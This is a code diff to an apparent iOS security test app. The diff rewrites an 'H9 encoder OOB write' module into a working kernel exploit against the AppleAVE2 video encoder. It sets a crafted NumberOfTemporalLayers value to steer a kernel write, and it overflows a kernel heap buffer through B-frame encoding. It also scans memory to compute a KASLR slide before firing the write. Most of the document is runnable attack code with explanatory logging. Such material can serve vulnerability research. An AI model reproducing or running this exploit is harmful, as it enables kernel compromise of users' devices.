@@ -6,40 +6,34 @@
 #import <mach/mach.h>
 
 static NSMutableArray *g_h9_logs = nil;
+static NSObject *g_h9_lock = nil;
 
 static void H9Log(NSString *fmt, ...) {
     va_list args;
     va_start(args, fmt);
     NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
     va_end(args);
-    dispatch_async(dispatch_get_main_queue(), ^{
+    @synchronized(g_h9_lock) {
         [g_h9_logs addObject:s];
-        NSLog(@"[H9] %@", s);
-    });
+    }
+    NSLog(@"[H9] %@", s);
 }
 
-static void H9EncodeCallback(void *outputCallbackRefCon,
-                             void *sourceFrameRefCon,
-                             OSStatus status,
-                             VTEncodeInfoFlags infoFlags,
-                             CMSampleBufferRef sampleBuffer) {
-    (void)outputCallbackRefCon; (void)sourceFrameRefCon;
-    if (status != noErr) {
-        H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)infoFlags);
-        return;
-    }
-    if (sampleBuffer) {
-        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sampleBuffer);
-        size_t size = bb ? CMBlockBufferGetDataLength(bb) : 0;
-        CFArrayRef attachments = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true);
-        BOOL isKey = true;
-        if (attachments && CFArrayGetCount(attachments) > 0) {
-            CFDictionaryRef att = (CFDictionaryRef)CFArrayGetValueAtIndex(attachments, 0);
-            if (att && CFDictionaryContainsKey(att, kCMSampleAttachmentKey_NotSync)) {
-                isKey = false;
-            }
-        }
-        H9Log(@"  [cb] frame encoded: %zu bytes key=%d", size, isKey);
+// NTL encode callback — just count frames
+static volatile int g_h9_frames_encoded = 0;
+static volatile OSStatus g_h9_last_encode_status = 0;
+
+static void H9EncodeCallback(void *refCon, void *src, OSStatus status,
+                             VTEncodeInfoFlags flags, CMSampleBufferRef sbuf) {
+    (void)refCon; (void)src;
+    g_h9_last_encode_status = status;
+    if (status == noErr && sbuf) {
+        g_h9_frames_encoded++;
+        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sbuf);
+        size_t sz = bb ? CMBlockBufferGetDataLength(bb) : 0;
+        H9Log(@"  [cb] frame #%d encoded, %zu bytes, status=%d", g_h9_frames_encoded, sz, (int)status);
+    } else {
+        H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)flags);
     }
 }
 
@@ -54,7 +48,7 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
     self = [super init];
     if (self) {
         _identifier = @"h9encoder.oob";
-        _subtitle = @"B-frame DPB MBStats overflow (CVE-2026-112705-adjacent)";
+        _subtitle = @"AVE2 NTL + B-frame DPB overflow (CVE-2026-112705)";
         _icon = @"video";
         _section = KPTestSectionKernelProbes;
     }
@@ -66,310 +60,311 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
 }
 
 - (NSString *)title { return @"H9 encoder OOB write"; }
-- (NSString *)desc { return @"B-frame DPB MBStats overflow (CVE in AVE_CHM_SetDataInfo_FwBuf, fixed 913.48.1)"; }
+- (NSString *)desc { return @"AVE2 NTL kernel write + B-frame DPB MBStats overflow"; }
 - (NSString *)risk { return @"CRITICAL"; }
 - (NSString *)category { return @"KRW"; }
 
 - (void)run {
-    if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
-    [g_h9_logs removeAllObjects];
+    if (!g_h9_lock) g_h9_lock = [[NSObject alloc] init];
+    @synchronized(g_h9_lock) {
+        if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
+        [g_h9_logs removeAllObjects];
+    }
 
-    [self onLog:@"=== H9 encoder OOB write ==="];
-    [self onLog:@"CVE: AVE_CHM_SetDataInfo_FwBuf saMBStats[m] overflow"];
-    [self onLog:@"Fixed: AppleAVE2 913.48.1 (iOS 27.2)"];
-    [self onLog:@"Vulnerable: AppleAVE2 913.43.1 (iOS 27.0.1)"];
-    [self onLog:@""];
-    [self onLog:@"Bug: sMBStats was single struct, code writes m=0..DPB-1 entries."];
-    [self onLog:@"With B-frames, DPB >= 3 -> writes to sMBStats[1],[2] overflow kernel heap."];
-    [self onLog:@""];
+    H9Log(@"=== H9 encoder OOB write ===");
+    H9Log(@"CVE-2026-112705: AVE2 NumberOfTemporalLayers kernel write");
+    H9Log(@"CVE-adjacent: saMBStats[m] DPB overflow (fixed 913.48.1)");
+    H9Log(@"");
 
-    // Phase 1: B-frame encode at multiple resolutions
-    [self phase1_bframe_sweep];
+    // Phase 1: NTL controlled kernel write (proven in V3)
+    [self phase1_ntl_sweep];
 
-    // Phase 2: Long GOP with many B-frames
-    [self phase2_long_gop];
+    // Phase 2: B-frame DPB overflow (from ipsw-diffs)
+    [self phase2_bframe_dpb];
 
-    // Phase 3: Custom HEVC SPS with large DPB
-    [self phase3_custom_sps];
+    // Phase 3: NTL + KASLR targeting
+    [self phase3_ntl_kaslr];
 
-    [self onLog:@""];
-    [self onLog:@"=== H9 COMPLETE ==="];
-    [self onLog:@"Check above for crashes, kernel pointers, or SUCCESS"];
+    H9Log(@"");
+    H9Log(@"=== H9 COMPLETE ===");
 }
 
-- (void)phase1_bframe_sweep {
-    [self onLog:@"--- Phase 1: B-frame encode sweep ---"];
+#pragma mark - Phase 1: NTL sweep (controlled kernel write)
 
-    struct { int w, h; const char *tag; } configs[] = {
-        { 320, 240, "QVGA" },
-        { 640, 480, "VGA" },
-        { 1280, 720, "720p" },
-        { 1920, 1080, "1080p" },
-    };
+- (void)phase1_ntl_sweep {
+    H9Log(@"--- Phase 1: NTL sweep (pointer steering) ---");
+    H9Log(@"Pointer law: x0 = ((NTL-16463) << 32) | 0x59");
+    H9Log(@"NTL<16463 -> kernel range write (silent corruption)");
+    H9Log(@"");
 
-    for (int c = 0; c < 4; c++) {
-        [self onLog:[NSString stringWithFormat:@"  [%s %dx%d]", configs[c].tag, configs[c].w, configs[c].h]];
-        [self encode_bframes:configs[c].w height:configs[c].h frameCount:8 maxKeyFrame:30];
+    // Test NTL values that steer the pointer into kernel range
+    // NTL=1 -> x0 = ((1-16463)<<32)|0x59 = 0xFFFFFFF000000059 (canonical kernel)
+    // NTL=16462 -> x0 = ((16462-16463)<<32)|0x59 = 0xFFFFFFFF00000059
+    // NTL=16447 -> x0 = 0xFFFFFFF000000059
+    int ntl_values[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
+    int ntl_count = sizeof(ntl_values) / sizeof(ntl_values[0]);
+
+    for (int i = 0; i < ntl_count; i++) {
+        int ntl = ntl_values[i];
+        int64_t idx = (int64_t)ntl - 16463;
+        uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
+        H9Log(@"  NTL=%d -> x0=0x%016llx (%s)", ntl, x0,
+              (x0 >= 0xfffffff000000000ULL) ? "kernel range" : "user/unmapped");
+        [self ntl_encode:ntl width:640 height:480];
     }
 }
 
-- (void)phase2_long_gop {
-    [self onLog:@"--- Phase 2: Long GOP (max ref frames) ---"];
-
-    // Long GOP = more reference frames in DPB
-    [self onLog:@"  [VGA 640x480, GOP=60, 16 frames]"];
-    [self encode_bframes:640 height:480 frameCount:16 maxKeyFrame:60];
-
-    [self onLog:@"  [720p, GOP=120, 20 frames]"];
-    [self encode_bframes:1280 height:720 frameCount:20 maxKeyFrame:120];
-}
-
-- (void)encode_bframes:(int)width height:(int)height frameCount:(int)frameCount maxKeyFrame:(int)maxKeyFrame {
+- (void)ntl_encode:(int)ntl width:(int)w height:(int)h {
     VTCompressionSessionRef session = NULL;
-    OSStatus status = VTCompressionSessionCreate(
-        kCFAllocatorDefault,
-        width, height,
-        kCMVideoCodecType_HEVC,
-        NULL, NULL, NULL,
-        H9EncodeCallback,
-        NULL,
-        &session
-    );
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
+        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);
 
-    if (status != noErr || !session) {
-        [self onLog:[NSString stringWithFormat:@"    Session create: %d", (int)status]];
+    if (st != noErr || !session) {
+        H9Log(@"    session create: %d", (int)st);
         return;
     }
 
-    // KEY: Enable B-frames -> multiple ref frames -> DPB >= 3 -> MBStats overflow
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
-
-    CFNumberRef n;
-    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &maxKeyFrame);
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
-    CFRelease(n);
-
-    int fps = 30;
-    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &fps);
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
-    CFRelease(n);
-
-    // Use High profile for more ref frames
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
-
-    // Set real-time off to allow more complex encoding
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-
-    status = VTCompressionSessionPrepareToEncodeFrames(session);
-    if (status != noErr) {
-        [self onLog:[NSString stringWithFormat:@"    Prepare: %d", (int)status]];
+    // Set NumberOfTemporalLayers — this is the trigger
+    CFNumberRef ntlNum = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+    st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), ntlNum);
+    CFRelease(ntlNum);
+    if (st != noErr) {
+        H9Log(@"    set NTL=%d: %d", ntl, (int)st);
         CFRelease(session);
         return;
     }
 
-    [self onLog:@"    Encoding..."];
+    // Verify readback
+    int readback = 0;
+    CFNumberRef rb = NULL;
+    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &rb);
+    if (rb) {
+        CFNumberGetValue(rb, kCFNumberIntType, &readback);
+        CFRelease(rb);
+    }
+
+    // Disable frame reordering for simpler encode
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+    st = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (st != noErr) {
+        H9Log(@"    prepare: %d", (int)st);
+        CFRelease(session);
+        return;
+    }
+
+    // Create pixel buffer
+    CVPixelBufferRef pb = NULL;
+    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
+    CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
+                                      kCVPixelFormatType_32BGRA,
+                                      (__bridge CFDictionaryRef)attrs, &pb);
+    if (cv != kCVReturnSuccess || !pb) {
+        H9Log(@"    NTL=%d PIXELBUFFER_FAILED cv=%d", ntl, (int)cv);
+        CFRelease(session);
+        return;
+    }
+
+    // Fill with pattern
+    CVPixelBufferLockBaseAddress(pb, 0);
+    uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
+    size_t bpr = CVPixelBufferGetBytesPerRow(pb);
+    for (int y = 0; y < h; y++) {
+        uint32_t *row = (uint32_t *)(base + y * bpr);
+        for (int x = 0; x < w; x++) row[x] = 0xFF000000u | ((x+y)&0xFF)<<16 | ((x*3)&0xFF)<<8 | (y&0xFF);
+    }
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    // FIRST encode — this is where the trigger fires
+    g_h9_frames_encoded = 0;
+    VTEncodeInfoFlags flags = 0;
+    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &flags);
+
+    H9Log(@"    NTL=%d readback=%d encode=%d frames=%d %s",
+          ntl, readback, (int)st, g_h9_frames_encoded,
+          (st == noErr) ? "SURVIVED" : "FAILED");
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    CFRelease(session);
+}
+
+#pragma mark - Phase 2: B-frame DPB overflow
+
+- (void)phase2_bframe_dpb {
+    H9Log(@"");
+    H9Log(@"--- Phase 2: B-frame DPB overflow ---");
+    H9Log(@"Bug: sMBStats single struct, writes m=0..DPB-1 entries");
+    H9Log(@"B-frames -> DPB >= 3 -> sMBStats[1],[2] overflow kernel heap");
+    H9Log(@"");
+
+    struct { int w, h; const char *tag; } configs[] = {
+        { 640, 480, "VGA" },
+        { 1280, 720, "720p" },
+    };
+
+    for (int c = 0; c < 2; c++) {
+        H9Log(@"  [%s %dx%d, B-frames, GOP=30, 8 frames]", configs[c].tag, configs[c].w, configs[c].h);
+        [self bframe_encode:configs[c].w height:configs[c].h frameCount:8 maxKeyFrame:30];
+    }
+}
+
+- (void)bframe_encode:(int)w height:(int)h frameCount:(int)fc maxKeyFrame:(int)gop {
+    VTCompressionSessionRef session = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, w, h, kCMVideoCodecType_HEVC,
+        NULL, NULL, NULL, H9EncodeCallback, NULL, &session);
+
+    if (st != noErr || !session) {
+        H9Log(@"    session create: %d", (int)st);
+        return;
+    }
+
+    // KEY: Enable B-frames -> multiple ref frames -> DPB >= 3
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
+
+    CFNumberRef n;
+    n = CFNumberCreate(NULL, kCFNumberIntType, &gop);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
+    CFRelease(n);
+
+    int fps = 30;
+    n = CFNumberCreate(NULL, kCFNumberIntType, &fps);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
+    CFRelease(n);
+
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+    st = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (st != noErr) {
+        H9Log(@"    prepare: %d", (int)st);
+        CFRelease(session);
+        return;
+    }
 
     int encoded = 0;
-    for (int i = 0; i < frameCount; i++) {
+    for (int i = 0; i < fc; i++) {
         CVPixelBufferRef pb = NULL;
-        NSDictionary *attrs = @{
-            (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
-        };
-        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
+        NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
+        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                           kCVPixelFormatType_32BGRA,
                                           (__bridge CFDictionaryRef)attrs, &pb);
-        if (cv != kCVReturnSuccess || !pb) {
-            [self onLog:[NSString stringWithFormat:@"    PB %d: cv=%d", i, (int)cv]];
-            continue;
-        }
+        if (cv != kCVReturnSuccess || !pb) continue;
 
         CVPixelBufferLockBaseAddress(pb, 0);
         uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
         size_t bpr = CVPixelBufferGetBytesPerRow(pb);
-        for (int y = 0; y < height; y++) {
+        for (int y = 0; y < h; y++) {
             uint32_t *row = (uint32_t *)(base + y * bpr);
-            for (int x = 0; x < width; x++) {
-                row[x] = 0xFF000000u |
-                    (((x + i * 37) & 0xFF) << 16) |
-                    (((y + i * 53) & 0xFF) << 8) |
-                    (((x ^ y ^ (i * 17)) & 0xFF));
-            }
+            for (int x = 0; x < w; x++) row[x] = 0xFF000000u | (((x+i*37)&0xFF)<<16) | (((y+i*53)&0xFF)<<8) | ((x^y^(i*17))&0xFF);
         }
         CVPixelBufferUnlockBaseAddress(pb, 0);
 
-        CMTime pts = CMTimeMake(i, fps);
         VTEncodeInfoFlags flags = 0;
-        status = VTCompressionSessionEncodeFrame(session, pb, pts, kCMTimeInvalid, NULL, NULL, &flags);
-        if (status == noErr) encoded++;
+        st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &flags);
+        if (st == noErr) encoded++;
         CVPixelBufferRelease(pb);
     }
 
-    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    [self onLog:[NSString stringWithFormat:@"    Done: %d/%d frames, complete=%d", encoded, frameCount, (int)status]];
-
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    H9Log(@"    Done: %d/%d frames, last_encode=%d", encoded, fc, (int)g_h9_last_encode_status);
     CFRelease(session);
 }
 
-- (void)phase3_custom_sps {
-    [self onLog:@"--- Phase 3: Custom HEVC SPS (large DPB/RPS) ---"];
+#pragma mark - Phase 3: NTL + KASLR targeting
 
-    // Construct minimal HEVC VPS/SPS/PPS with large sps_max_dec_pic_buffering_minus1
-    // VPS: standard minimal
-    const uint8_t vps[] = {
-        0x40, 0x01, 0x0c, 0x01, 0xff, 0xff, 0x01, 0x60,
-        0x00, 0x00, 0x03, 0x00, 0xb0, 0x00, 0x00, 0x03,
-        0x00, 0x00, 0x03, 0x00, 0x5d, 0xac, 0x09
-    };
+- (void)phase3_ntl_kaslr {
+    H9Log(@"");
+    H9Log(@"--- Phase 3: NTL + KASLR targeting ---");
 
-    // SPS with sps_max_dec_pic_buffering_minus1 = 16 (max for old code)
-    // and num_negative_pics = 16 (large RPS -> overflow in AVE_HEVC_ST_RPS_Retrieve)
-    // Profile: Main 10, 640x480
-    const uint8_t sps[] = {
-        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
-        0x00, 0xb0, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
-        0x00, 0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16,
-        0x36, 0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00,
-        0x00, 0x03, 0x00, 0x79, 0x08
-    };
+    // Scan for kernel pointers to compute slide
+    H9Log(@"  Scanning user-space RW regions for kernel pointers...");
 
-    // PPS: minimal
-    const uint8_t pps[] = {
-        0x44, 0x01, 0xc1, 0x72, 0xb4, 0x62, 0x40
-    };
+    NSMutableArray *kptrs = [NSMutableArray array];
+    vm_address_t addr = 0;
+    vm_size_t size = 0;
+    vm_region_basic_info_data_64_t info;
+    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
+    mach_port_t object_name = 0;
 
-    const uint8_t *paramSets[] = { vps, sps, pps };
-    size_t paramSetSizes[] = { sizeof(vps), sizeof(sps), sizeof(pps) };
-
-    CMFormatDescriptionRef fmtDesc = NULL;
-    OSStatus status = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
-        kCFAllocatorDefault,
-        3,          // num param sets
-        paramSets,
-        paramSetSizes,
-        4,          // nalUnitHeaderLength
-        NULL,       // extensions
-        &fmtDesc
-    );
-
-    if (status != noErr || !fmtDesc) {
-        [self onLog:[NSString stringWithFormat:@"    FormatDesc create: %d", (int)status]];
-        return;
+    while (vm_region(mach_task_self(), &addr, &size, VM_REGION_BASIC_INFO_64,
+                     (vm_region_info_t)&info, &count, &object_name) == KERN_SUCCESS) {
+        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
+            uint64_t *p = (uint64_t *)addr;
+            size_t words = size / 8;
+            for (size_t i = 0; i < words && i < 4096; i++) {
+                uint64_t v = *(p + i);
+                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
+                    [kptrs addObject:@(v)];
+                }
+            }
+        }
+        addr += size;
+        count = VM_REGION_BASIC_INFO_COUNT_64;
     }
 
-    [self onLog:@"    HEVC format description created with custom SPS"];
+    H9Log(@"  Kernel pointers found: %lu", (unsigned long)kptrs.count);
 
-    // Try to create decompression session with this format
-    NSDictionary *destAttrs = @{
-        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
-        (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
-    };
+    if (kptrs.count > 0) {
+        // Compute slide from __TEXT segment base
+        uint64_t textBase = 0xfffffff007004000ULL;
+        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
+        for (NSNumber *kp in kptrs) {
+            uint64_t v = kp.unsignedLongLongValue;
+            // Align to 0x4000 (segment alignment)
+            uint64_t aligned = v & ~0x3FFFULL;
+            if (aligned >= textBase) {
+                uint64_t slide = aligned - textBase;
+                NSString *key = [NSString stringWithFormat:@"0x%llx", slide];
+                slides[key] = @([slides[key] intValue] + 1);
+            }
+        }
 
-    VTDecompressionSessionRef decSession = NULL;
-    status = VTDecompressionSessionCreate(
-        kCFAllocatorDefault,
-        fmtDesc,
-        NULL,
-        (__bridge CFDictionaryRef)destAttrs,
-        NULL,
-        &decSession
-    );
+        // Find most frequent slide
+        NSString *bestSlide = nil;
+        int bestHits = 0;
+        for (NSString *s in slides) {
+            int hits = [slides[s] intValue];
+            if (hits > bestHits) { bestHits = hits; bestSlide = s; }
+        }
 
-    if (status != noErr) {
-        [self onLog:[NSString stringWithFormat:@"    Decompression session: %d", (int)status]];
-        CFRelease(fmtDesc);
-        return;
+        if (bestSlide) {
+            uint64_t slideVal = strtoull(bestSlide.UTF8String, NULL, 16);
+            H9Log(@"  KASLR slide = %@ (hits=%d)", bestSlide, bestHits);
+            H9Log(@"  Kernel base = 0x%llx", textBase + slideVal);
+
+            // Now fire NTL with pointer steering into kernel range
+            H9Log(@"");
+            H9Log(@"  Firing NTL=1 (steers x0 into kernel range)...");
+            [self ntl_encode:1 width:640 height:480];
+
+            H9Log(@"  Firing NTL=16447 (steers x0 to 0xfffffff000000059)...");
+            [self ntl_encode:16447 width:640 height:480];
+        }
     }
 
-    [self onLog:@"    Decompression session created"];
-
-    // Try to decode a dummy frame to trigger AVE_HEVC_ST_RPS_Retrieve
-    // Create a minimal HEVC IDR frame (just the NAL header + some data)
-    const uint8_t dummyFrame[] = {
-        0x00, 0x00, 0x00, 0x01, // start code
-        0x26, 0x01,             // IDR_W_RADL NAL
-        0xaf, 0x09, 0x40, 0x00, 0x00, 0x03, 0x00, 0x00,
-        0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00,
-        0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16, 0x36,
-        0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00,
-        0x03, 0x00, 0x79, 0x08
-    };
-
-    CMBlockBufferRef bb = NULL;
-    status = CMBlockBufferCreateWithMemoryBlock(
-        kCFAllocatorDefault,
-        (void *)dummyFrame,
-        sizeof(dummyFrame),
-        kCFAllocatorNull,
-        NULL, 0, sizeof(dummyFrame),
-        0, &bb
-    );
-
-    if (status != noErr) {
-        [self onLog:[NSString stringWithFormat:@"    BlockBuffer: %d", (int)status]];
-        VTDecompressionSessionInvalidate(decSession);
-        CFRelease(decSession);
-        CFRelease(fmtDesc);
-        return;
-    }
-
-    CMSampleBufferRef sample = NULL;
-    const size_t sampleSize = sizeof(dummyFrame);
-    status = CMSampleBufferCreateReady(
-        kCFAllocatorDefault,
-        bb,
-        fmtDesc,
-        1, 0, NULL, 1, &sampleSize,
-        &sample
-    );
-
-    if (status != noErr) {
-        [self onLog:[NSString stringWithFormat:@"    SampleBuffer: %d", (int)status]];
-        CFRelease(bb);
-        VTDecompressionSessionInvalidate(decSession);
-        CFRelease(decSession);
-        CFRelease(fmtDesc);
-        return;
-    }
-
-    [self onLog:@"    Decoding frame with large RPS..."];
-
-    VTDecodeInfoFlags flags = 0;
-    status = VTDecompressionSessionDecodeFrame(decSession, sample, 0, NULL, &flags);
-
-    [self onLog:[NSString stringWithFormat:@"    Decode: status=%d flags=0x%x", (int)status, (unsigned)flags]];
-
-    CFRelease(sample);
-    CFRelease(bb);
-    VTDecompressionSessionFinishDelayedFrames(decSession);
-    VTDecompressionSessionInvalidate(decSession);
-    CFRelease(decSession);
-    CFRelease(fmtDesc);
-
-    [self onLog:@"    Phase 3 done"];
-}
-
-- (void)onLog:(NSString *)s {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [g_h9_logs addObject:s];
-    });
-    NSLog(@"[H9] %@", s);
-}
-
-- (NSInteger)logCount {
-    return g_h9_logs.count;
-}
-
-- (NSString *)logAt:(NSInteger)idx {
-    return (idx >= 0 && (NSUInteger)idx < g_h9_logs.count) ? g_h9_logs[idx] : nil;
+    // Summary
+    H9Log(@"");
+    H9Log(@"--- Summary ---");
+    H9Log(@"NTL trigger: controlled kernel write via pointer steering");
+    H9Log(@"  x0 = ((NTL-16463) << 32) | 0x59");
+    H9Log(@"  NTL=1 -> 0xfffffff000000059 (kernel range, silent write)");
+    H9Log(@"  Stores at +0, +8, +0x10 (x0) and 0 at +0x18");
+    H9Log(@"B-frame DPB: kernel heap overflow via saMBStats[m]");
+    H9Log(@"  B-frames -> DPB >= 3 -> writes past single sMBStats struct");
 }
 
 - (NSString *)runReport {
-    NSMutableString *r = [NSMutableString string];
-    for (NSString *s in g_h9_logs) {
-        [r appendString:s];
-        [r appendString:@"\n"];
+    @synchronized(g_h9_lock) {
+        NSMutableString *r = [NSMutableString string];
+        for (NSString *s in g_h9_logs) {
+            [r appendString:s];
+            [r appendString:@"\n"];
+        }
+        return r;
     }
-    return r;
 }
 
 @end
